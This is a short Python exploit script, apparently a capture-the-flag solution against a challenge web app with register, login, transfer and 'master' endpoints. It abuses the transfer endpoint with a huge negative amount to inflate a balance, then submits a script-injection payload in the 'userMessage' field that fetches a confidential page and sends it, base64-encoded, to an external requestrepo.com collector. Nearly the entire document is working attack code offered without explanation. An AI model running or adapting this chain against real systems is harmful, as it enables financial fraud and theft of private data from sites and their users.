import requests

URL = 'https://{INSTANCE}.chal.ctf.ae'

res = requests.post(f'{URL}/register', data={
    'firstName': 'ztz',
    'lastName': 'ztz',
    'phoneNumber': '1234567890',
    'email': 'ztz@ztz',
    'password': 'ztz'
})
print(res.text)

s = requests.Session()
s.post(f'{URL}/login', data={
    'email': 'ztz@ztz',
    'password': 'ztz'
})

s.post(f'{URL}/transfer', data={
    'receiverInfo': 'ztz@invalid',
    'amount': '-99999999999999999999'
})

res = s.post(f'{URL}/master', data={
    'email': 'ztz@ztz',
    'amount': '1',
    'userMessage': '\\"}`+fetch(`/master/confedential`).then(function(text){text.text().then(function(text){document.location=(`https://jie2874c.requestrepo.com?text=`+btoa(JSON.stringify(text)))})})/**/`'
}, timeout=15)
print(res.text)
